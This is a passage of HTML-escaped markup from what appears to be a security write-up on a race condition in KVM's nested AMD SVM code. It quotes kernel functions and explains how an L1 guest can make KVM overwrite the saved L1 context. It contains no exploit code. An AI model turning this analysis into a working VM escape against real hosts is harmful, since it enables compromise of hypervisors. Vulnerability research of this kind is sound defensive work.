href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/kvm/svm/svm.c?h=v5.11"&gt;arch/x86/kvm/svm.c&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which is called whenever a VMexit occurs. When KVM is running a nested guest, it first has to check if the exit should be handled by itself or the L1 hypervisor. To do this it calls the function &lt;/span&gt;&lt;span class="c15"&gt;nested_svm_exit_handled&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c15"&gt;5&lt;/span&gt;&lt;span&gt;) whi&lt;/span&gt;&lt;span&gt;ch will return &lt;/span&gt;&lt;span class="c6"&gt;NESTED_EXIT_DONE if the vmexit will be handled by the L1 hypervisor and no further processing by the L0 hypervisor is needed&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.dbf1a4595680d452b12d73cacee8ee680ca43081"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;handle_exit&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_vcpu &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;fastpath_t exit_fastpath&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;to_svm&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;kvm_run &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;kvm_run &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;run&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u32 exit_code &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_code&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;&amp;hellip;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;is_guest_mode&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vcpu&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmexit&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; trace_kvm_nested_vmexit&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;exit_code&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;KVM_ISA_SVM&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmexit &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_exit_special&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vmexit &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NESTED_EXIT_CONTINUE&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmexit &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_exit_handled&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;5&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vmexit &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NESTED_EXIT_DONE&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_intercept&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; // exit_code&lt;/span&gt;&lt;span class="c23"&gt;==INTERCEPT_VMRUN when the L2 guest executes vmrun&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c3"&gt;u32 exit_code &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;vmcb&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;control&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;exit_code&lt;/span&gt;&lt;span class="c1"&gt;; &lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmexit &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NESTED_EXIT_HOST&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;switch&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;exit_code&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;case&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SVM_EXIT_MSR&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmexit &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_exit_handled_msr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;case&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SVM_EXIT_IOIO&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmexit &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_intercept_ioio&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;&amp;hellip;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;default&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vmcb_is_intercept&lt;/span&gt;&lt;span class="c1"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;nested&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c3"&gt;ctl&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;exit_code&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;7&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmexit &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NESTED_EXIT_DONE&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmexit&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_exit_handled&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vcpu_svm &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmexit&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vmexit &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;nested_svm_intercept&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;6&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;vmexit &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NESTED_EXIT_DONE&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; nested_svm_vmexit&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;svm&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;8&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;**&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;vmexit&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c29 c25 c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c29 c25 c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c15 c6"&gt;nested_svm_exit_handled&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;first calls &lt;/span&gt;&lt;span class="c15 c6"&gt;nested_svm_intercept (6)&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;to see if the exit should be handled. When we trigger an exit by executing VMRUN in a L2 guest, the default case is executed (&lt;/span&gt;&lt;span class="c15 c6"&gt;7&lt;/span&gt;&lt;span class="c6"&gt;) &lt;/span&gt;&lt;span class="c6"&gt;to see if the INTERCEPT_VMRUN bit in svm-&amp;gt;nested.ctl is set. &lt;/span&gt;&lt;span class="c6"&gt;Normally, this should always be the case and the function returns NESTED_EXIT_DONE to trigger a nested VM exit from L2 to L1 and to let the L1 hypervisor handle the exit (&lt;/span&gt;&lt;span class="c15 c6"&gt;8&lt;/span&gt;&lt;span class="c8 c6"&gt;). (This way KVM supports infinite nesting of hypervisors).&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8 c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c6"&gt;However, if the L1 guest exploited the race condition described above svm-&amp;gt;nested.ctl won&amp;rsquo;t have the INTERCEPT_VMRUN bit set and the VM exit will be handled by KVM itself. This results in a second call to &lt;/span&gt;&lt;span class="c15 c6"&gt;nested_svm_vmrun&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;while still running inside the L2 guest context. &lt;/span&gt;&lt;span class="c15 c6"&gt;nested_svm_vmrun&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;isn&amp;rsquo;t written to handle this situation and will blindly overwrite the L1 context stored in &lt;/span&gt;&lt;span class="c15 c6"&gt;svm-&amp;gt;nested.hsave&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;with data from the currently active &lt;/span&gt;&lt;span class="c15 c6"&gt;svm-&amp;gt;vmcb&lt;/span&gt;&lt;span class="c8 c6"&gt;&amp;nbsp;which contains data for the L2 guest:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c25 c6 c38"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a93b45d970c173b162741ed3aef6ddfd79d4b4d0"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c22"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Save the old vmcb, so we don&amp;#39;t need to pick what we save, but can&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* restore everything when a VMEXIT occurs&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c22 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;es &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;es&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cs &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;cs&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hsave&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;ss &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c6"&gt;=&lt;/span&gt;&lt;span class="c3 c6"&gt;&amp;nbsp;vmcb&lt;/span&gt;&lt;span class="c1 c6"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c6"&gt;save&lt;/span&gt;&lt;span class="c1 c6"&gt;.&lt;/span&gt;&lt;span class="c3 c6"&gt;ss&lt;/span&gt;&lt;span class="c1 c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3 